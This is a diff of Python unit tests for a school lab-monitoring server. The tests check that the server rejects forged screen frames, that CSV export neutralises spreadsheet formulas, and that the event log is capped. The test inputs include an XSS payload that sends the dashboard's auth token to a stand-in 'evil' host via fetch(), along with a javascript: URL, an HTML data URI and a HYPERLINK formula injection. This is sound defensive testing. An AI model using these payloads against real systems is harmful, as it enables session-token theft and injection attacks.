@@ -428,6 +428,48 @@ class ServerTests(unittest.TestCase):
         self.assertEqual((events[0]["hostname"], events[0]["student_name"]), ("PC-OCORR", "Gil"))
         self.assertEqual(call("GET", "/api/events")[0], 401)
 
+    def test_forged_screen_frame_is_rejected(self):
+        """Quadro com HTML/URL (XSS no painel) não pode ser guardado nem repassado."""
+        evil = 'x" onerror="fetch(`//evil/`+localStorage.gestorlab_auth_token)" data-x="'
+        good = "data:image/jpeg;base64,/9j/4AAQSkZJRg=="
+
+        async def scenario():
+            url = f"ws://127.0.0.1:{PORT}"
+            async with websockets.connect(f"{url}/ws/client") as agent:
+                await agent.send(json.dumps({"type": "register", "hostname": "PC-XSS", "id": "PC-VITIMA-1.2.3.4"}))
+                await agent.recv()
+                async with websockets.connect(f"{url}/ws/dashboard?token={self.token}") as dash:
+                    init = json.loads(await dash.recv())
+                    ids = [c["id"] for c in init["clients"]]
+                    for bad in (evil, "javascript:alert(1)", "https://evil/x.jpg", "data:text/html;base64,PHNjcmlwdD4=",
+                                "data:image/jpeg;base64," + "A" * (5 * 1024 * 1024)):
+                        await agent.send(json.dumps({"type": "screen_frame", "data": bad}))
+                    await agent.send(json.dumps({"type": "screen_frame", "data": good}))
+                    frame = await recv_until(dash, "type", "screen_frame")
+                    return ids, frame["data"]
+
+        ids, delivered = asyncio.run(scenario())
+        self.assertEqual(delivered, "data:image/jpeg;base64,/9j/4AAQSkZJRg==")   # só o quadro válido chegou
+        self.assertIn("PC-XSS-127.0.0.1", ids)          # id vem do servidor, não do agente
+        self.assertNotIn("PC-VITIMA-1.2.3.4", ids)
+
+    def test_csv_export_neutralizes_formulas(self):
+        database.create_student("=HYPERLINK(\"http://evil\")", "CSV-1", "9X", "s")
+        status, data = call("GET", "/api/students.csv", token=self.token, raw=True)
+        text = data.decode("utf-8-sig")
+        self.assertIn("'=HYPERLINK", text)
+        self.assertNotIn(";=HYPERLINK", text)
+
+    def test_events_table_is_capped(self):
+        for i in range(5010):
+            database.record_event("PC-CAP", "", "site", str(i)) if i % 500 == 0 else None
+        with database.connect() as conn:
+            conn.executemany("INSERT INTO events (hostname, kind, detail) VALUES ('PC-CAP', 'site', ?)",
+                             [(str(i),) for i in range(5200)])
+        database.record_event("PC-CAP", "", "site", "ultimo")
+        with database.connect() as conn:
+            self.assertLessEqual(conn.execute("SELECT COUNT(*) FROM events").fetchone()[0], 5001)
+
     def test_reconnect_keeps_new_connection(self):
         async def scenario():
             url = f"ws://127.0.0.1:{PORT}/ws/client"
